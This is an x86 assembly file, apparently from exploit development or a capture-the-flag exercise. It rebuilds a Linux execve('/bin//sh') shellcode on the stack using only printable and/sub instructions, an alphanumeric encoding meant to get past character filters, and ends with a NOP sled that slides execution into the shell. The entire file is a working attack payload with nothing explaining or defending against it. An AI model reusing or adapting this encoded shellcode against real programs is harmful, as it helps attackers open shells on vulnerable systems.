global _start
	_start:
		;========================
		; \x90\x90\x90\x31
		; \xc9\x51\x68\x2f
		; \x2f\x73\x68\x68
		; \x2f\x62\x69\x6e
		; \x89\xe3\x6a\x0b
		; \x58\x99\xcd\x80
		;========================
		;  add esp, 1024
		;========================
		push esp
		pop eax
		; add eax, 1024 <==> sub eax, (2**32 - 1024)
        sub eax, 4d4d4d4dH
        sub eax, 4d4d4d4dH
        sub eax, 65656166H
		push eax
		pop esp
		;========================
		;  set $eax = shellcode[0:-4]
		; \x58\x99\xcd\x80
		;========================
		; set $eax = 0
		and eax, 49494949H
		and eax, 30303030H
sub eax, 8d776680H
sub eax, 8d776680H
sub eax, 8c776580H
		push eax
		
		;========================
		;  set $eax = shellcode[-8:-4]
		; \x89\xe3\x6a\x0b
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 7d628752H
sub eax, 7c5d8752H
sub eax, 7c5c8751H
		push eax
		
		;========================
		;  set $eax = shellcode[-12:-8]
		; \x2f\x62\x69\x6e
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 9b8a8786H
sub eax, 9a898786H
sub eax, 9a898786H
		push eax
		;========================
		;  set $eax = shellcode[-16:-12]
		; \x2f\x73\x68\x68
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 9b848888H
sub eax, 9a848788H
sub eax, 9a838788H
		push eax
		
		;========================
		;  set $eax = shellcode[-20:-16]
		; \xc9\x51\x68\x2f
		;========================
		and eax, 49494949H
		and eax, 30303030H
		sub eax, 678f889bH
		sub eax, 678f879bH
		sub eax, 678f879bH
		push eax
		;========================
		;  set $eax = shellcode[-21:-20]
		; \x90\x90\x90\x31
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 7a7a7a9bH
sub eax, 7a7a7a9aH
sub eax, 7a7a7a9aH
		push eax
		;========================
		;  set $eax = \x90\x90\x90\x90 (nop)
		;========================
		and eax, 49494949H
		and eax, 30303030H
sub eax, 7a7a7a7bH
sub eax, 7a7a7a7bH
sub eax, 7a7a7a7aH
		push eax
		;========================
		; fill pad with nop ; then $eip = $esp
		; and the shellcode is going to be excute
		;========================
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
		push eax
